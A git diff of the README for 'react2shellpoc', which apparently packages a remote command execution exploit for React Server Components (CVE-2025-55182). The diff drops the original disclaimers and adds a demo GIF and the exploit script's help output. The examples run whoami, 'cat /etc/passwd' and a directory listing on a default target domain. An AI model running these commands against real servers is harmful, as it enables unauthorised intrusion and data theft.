@@ -1,45 +1,48 @@
 # ⚡ react2shellpoc
 
-> 🚨 **Educational Proof of Concept – Use Responsibly**
+> 🚨 **Educational Proof of Concept – Handle With Care**
 
-**react2shellpoc** is a sleek and minimal **proof-of-concept** project that demonstrates how a **React-based frontend** can interact with **system-level shell commands**.
+**react2shellpoc** is a proof-of-concept project demonstrating how a **React-based frontend** can be abused to trigger **system-level shell command execution** under insecure configurations.
 
-The goal of this project is to explore:
-- 🔗 UI → OS communication flows  
-- 🧱 Execution boundaries & isolation layers  
-- ⚠️ Security risks caused by misconfiguration or poor sandboxing  
-
-This repository is designed **strictly for educational, research, and security testing purposes**.  
-It highlights how modern web interfaces can become dangerous when backend execution is improperly controlled.
+This project focuses on:
+- 🔗 React UI → OS command execution flows  
+- 🧱 Broken trust boundaries in modern web stacks  
+- ⚠️ Real-world security risks caused by misconfiguration  
 
 ---
 
-## ✨ Key Features
-- React-based frontend interface  
-- Shell command execution bridge (PoC)  
-- Clear demonstration of security implications  
-- Lightweight and easy-to-understand structure  
+## 🎥 Video PoC
+
+<p align="center">
+  <img src="https://private-user-images.githubusercontent.com/158517938/523478299-d1d86d72-39cb-4af8-9dca-611a0cad9ef7.gif" alt="react2shellpoc demo" />
+</p>
 
 ---
 
-## 🎯 Use Cases
-- Security research & vulnerability analysis  
-- Understanding frontend–backend trust boundaries  
-- Educational demos for secure system design  
+## 💻 Proof of Concept (CLI View)
 
----
+```bash
+┌──(kali㉿kali)-[~/Documents/tools/2025-55182]
+└─$ python exploit.py -h
 
-## ⚠️ Disclaimer
-This project is **not intended for production use**.  
-Running or modifying this code on real systems without proper isolation may be **dangerous**.
+      /\
+     /**\
+    /****\
+   /******\
+  /********\
+ /**********\
+      ||
 
-> **You are fully responsible for how you use this code.**
+    [CVE-2025-55182 React Server Components RCE]
 
----
+usage: exploit.py [-h] [-t URL] [-c CMD]
 
-## 🧠 Philosophy
-> *If a UI can talk to the OS, security becomes a design problem — not an afterthought.*
+options:
+  -h, --help         show this help message and exit
+  -t, --target URL   Target URL or domain (default: http://hacx.me)
+  -c, --command CMD  Command to execute on target (default: id)
 
----
-
-🔥 **Stay curious. Stay secure.**
+Examples:
+  exploit.py -t hacx.me -c "whoami"
+  exploit.py -t http://hacx.me -c "cat /etc/passwd"
+  exploit.py -t hacx.me -c "ls -la /var/www"
